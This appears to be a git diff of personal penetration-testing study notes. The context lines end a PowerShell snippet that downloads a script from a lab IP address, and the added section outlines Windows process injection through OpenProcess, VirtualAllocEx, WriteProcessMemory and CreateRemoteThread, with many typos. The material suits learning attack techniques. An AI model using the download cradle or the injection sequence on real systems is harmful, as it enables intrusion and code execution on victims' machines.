@@ -220,3 +220,20 @@ $proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curr
 $wc = New-Object System.Net.WebClient
 $wc.downloadstring('http://192.168.49.53/run2.ps1')
 ```
+# Process injection and migration
+
+Process is a container that created to host a application. Every process has its own virtual memory space.  
+These space are not meant to interact with one another, but we are able to accomplish this with various win32 api.  
+
+A thread executes the complied assemby code of the application. A process may have multiple threads to perform simultaneous actio and each thread have its stack and share the virtual memory space of the process.
+
+As an overvew we can initiate windows-based injectin by opening a channel from one process to another through the win32 *OpenProcess* API.  
+Modify memory space through the *VirtualAllocEx* and *WriteProcessMemory* API.  
+Create a new execution thread inside the remote process with *CreateRemoteThread*.   
+
+### OpenProcess API
+
+*OpenProcess* API opens an existing local process for interaction
+ - *dwDeseiredAccess* established the access rights require on that process.
+    - Every process have a *security descriptor* that specifies file permission of the executable and access rights of a user or group.
+    - Every process have a *integrity level* that restricted acess to it. This works when blockng access to a higher integrity level, however access to a low level integrity level access is possible.
